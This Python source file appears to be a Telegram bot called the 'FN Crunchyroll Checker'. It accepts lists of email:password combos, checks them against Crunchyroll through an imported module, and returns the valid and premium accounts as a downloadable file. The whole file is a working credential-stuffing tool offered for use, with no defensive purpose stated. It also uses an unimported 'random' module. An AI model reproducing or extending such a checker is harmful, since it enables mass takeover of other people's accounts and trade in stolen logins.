import asyncio
import telebot
import os
import io
import logging
import time
from telebot import types
from telebot import apihelper
from dotenv import load_dotenv
from crunchyroll_api import process_combos  # Import the API functions

# Load environment variables from .env file
load_dotenv()

# Initialize the bot with your token from environment variables
bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
if not bot_token:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is not set.")

# Set a higher timeout for Telegram API requests
apihelper.SESSION_TIME_TO_LIVE = 60  # 60 seconds
bot = telebot.TeleBot(bot_token, parse_mode='HTML')

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Statistics data structure
statistics = {
    'total_combos_checked': 0,
    'total_successful_checks': 0,
    'total_premium_accounts': 0,
    'total_errors': 0
}

# Function to send messages with retries
def send_message_with_retry(chat_id, text, max_retries=3, delay=5):
    for attempt in range(max_retries):
        try:
            bot.send_message(chat_id, text, parse_mode='HTML')
            break  # Exit the loop if the message is sent successfully
        except Exception as e:
            logging.error(f"Attempt {attempt + 1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(delay)  # Wait before retrying
            else:
                logging.error(f"Failed to send message after {max_retries} attempts.")

# Start command to explain how to use the bot
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup()
    community_button = types.InlineKeyboardButton("𝐅𝐍 𝐍𝐄𝐓𝐖𝐎𝐑𝐊", url='https://t.me/fn_network_back')
    anuj_button = types.InlineKeyboardButton("𝐀𝐍𝐔𝐉", url='https://t.me/anuj_singg')
    markup.add(community_button, anuj_button)

    bot.send_photo(message.chat.id, 'https://anujx.cc/crunchyroll.jpg', caption="""
    <b>⚡️ Welcome to the FN Crunchyroll Checker! ⚡️</b>

    <i>Use the /chk command followed by email:pass pairs to make requests, or upload a file with the pairs.</i>

    <b>Example:</b>
    <code>/chk email1:pass1\nemail2:pass2</code>

    <b>High-Tech FN Checker</b>
    """, reply_markup=markup)

# Handle /chk command to process email:pass pairs from text
@bot.message_handler(commands=['chk'])
def handle_chk(message):
    combos = message.text[len('/chk '):].strip().splitlines()
    if not combos or combos == ['']:
        bot.reply_to(message, "⚠️ <b>Please provide combos in the format:</b> <code>email:password</code>")
        return
    bot.reply_to(message, "🔄 <b>Processing your combos. Please wait...</b>")
    asyncio.run(process_and_send_results(message, combos, message.from_user.first_name))

# Handle file uploads
@bot.message_handler(content_types=['document'])
def handle_docs(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_stream = io.StringIO(downloaded_file.decode('utf-8'))
        combos = file_stream.read().strip().splitlines()
        bot.reply_to(message, "🔄 <b>Processing your file. Please wait...</b>")
        asyncio.run(process_and_send_results(message, combos, message.from_user.first_name))
    except Exception as e:
        logging.error(f"Error processing file: {e}")
        bot.reply_to(message, f"⚠️ <b>There was an error processing your file:</b> {str(e)}")

# Function to process combos and send results
async def process_and_send_results(message, combos, user_name):
    statistics['total_combos_checked'] += len(combos)
    premium_responses = []

    results = await process_combos(combos)  # Use the API function
    for email, pasw, status in results:
        response_text = f"<code>Email: {email}</code>\n<code>Password: {pasw}</code>\n<i>Response: {status}</i>\n"
        send_message_with_retry(message.chat.id, response_text)
        if status == "Premium❇️":
            premium_responses.append(f"{email}:{pasw}\n")
            statistics['total_premium_accounts'] += 1
        if status != "Bad❌️" and status != "Blocked🚫":
            statistics['total_successful_checks'] += 1

    # Save premium responses to a file and send it to the user
    if premium_responses:
        random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(8))
        file_name = f'fncrunchy_{random_string}.txt'
        with open(file_name, 'w', encoding='utf-8') as file:
            file.writelines(premium_responses)
            file.write("--------------------------------\n")
            file.write("𝗧𝗵𝗲 𝗙𝗡 𝗖𝗿𝘂𝗻𝗰𝗵𝘆𝗿𝗼𝗹𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗿! ⚡️\n")
            file.write(f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝗬 - {user_name}\n")
            file.write("𝗕𝗼𝘁 𝗟𝗶𝗻𝗸 - https://t.me/crunchyrollChkkbot\n")
        with open(file_name, 'rb') as file:
            bot.send_document(message.chat.id, file)
        os.remove(file_name)  # Clean up the file after sending

# Admin command to view statistics
@bot.message_handler(commands=['stats'])
def view_stats(message):
    stats_message = (
        f"📊 <b>FN Crunchyroll Checker Stats</b>\n\n"
        f"Total Combos Checked: {statistics['total_combos_checked']}\n"
        f"Total Successful Checks: {statistics['total_successful_checks']}\n"
        f"Total Premium Accounts: {statistics['total_premium_accounts']}\n"
        f"Total Errors: {statistics['total_errors']}"
    )
    bot.reply_to(message, stats_message, parse_mode='HTML')

# Start the bot
if __name__ == '__main__':
    logging.info("Starting the bot...")
    bot.polling(none_stop=True, interval=0)
